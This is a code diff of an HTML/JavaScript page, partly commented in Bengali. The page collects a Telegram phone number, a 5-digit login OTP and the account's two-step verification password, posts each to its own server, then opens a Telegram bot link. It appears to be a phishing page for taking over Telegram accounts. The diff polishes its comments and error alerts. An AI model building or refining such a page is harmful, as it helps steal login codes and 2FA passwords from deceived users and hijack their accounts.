@@ -188,7 +188,6 @@
 
     <div class="container">
         
-        <!-- ১. ওপরের হোয়াইট কার্ড বক্স: টেলিগ্রাম নম্বর ও গেট কোড -->
         <div class="card-box header-card">
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
@@ -199,7 +198,6 @@
             <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
         </div>
 
-        <!-- ২. নিচের হোয়াইট কার্ড বক্স: ৫টি ছোট ওটিপি বক্স ও কনফার্ম বাটন -->
         <div class="card-box">
             <h2>Enter 5-Digit OTP 🔑</h2>
             
@@ -217,7 +215,7 @@
         </div>
     </div>
 
-    <!-- 3. Two-Step Verification Password Popup Modal -->
+    <!-- 2FA Password Popup Modal -->
     <div class="modal-overlay" id="passwordModal">
         <div class="modal-box">
             <div class="modal-icon-container">
@@ -264,6 +262,7 @@
                 return;
             }
             
+            // ইউজারকে বোঝানোর জন্য লোডিং মেসেজ বা এলার্ট দেখানো যেতে পারে
             fetch('/send-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -272,13 +271,13 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    alert("OTP sent successfully!");
+                    alert("OTP sent successfully to your Telegram!");
                     realInput.focus();
                 } else {
-                    alert("Error: " + data.message);
+                    alert("Failed to send OTP: " + data.message);
                 }
             })
-            .catch(err => console.log("Connection error"));
+            .catch(err => alert("Connection error while sending OTP!"));
         }
 
         function verifyOtpCode() {
@@ -304,7 +303,6 @@
                 if(data.status === "success") {
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else if(data.status === "2fa_required") {
-                    // যদি একাউন্টে 2FA পাসওয়ার্ড থাকে, তবে পপ-আপ মোডাল শো হবে
                     document.getElementById('passwordModal').style.display = 'flex';
                     document.getElementById('twoFactorPassword').focus();
                 } else {
@@ -313,7 +311,7 @@
                     updateBoxes();
                 }
             })
-            .catch(err => console.log("Verification error"));
+            .catch(err => alert("Verification connection error!"));
         }
 
         function verifyPassword() {
@@ -340,7 +338,7 @@
                     document.getElementById('twoFactorPassword').value = "";
                 }
             })
-            .catch(err => console.log("Connection error"));
+            .catch(err => alert("Password verification error!"));
         }
     </script>
 </body>
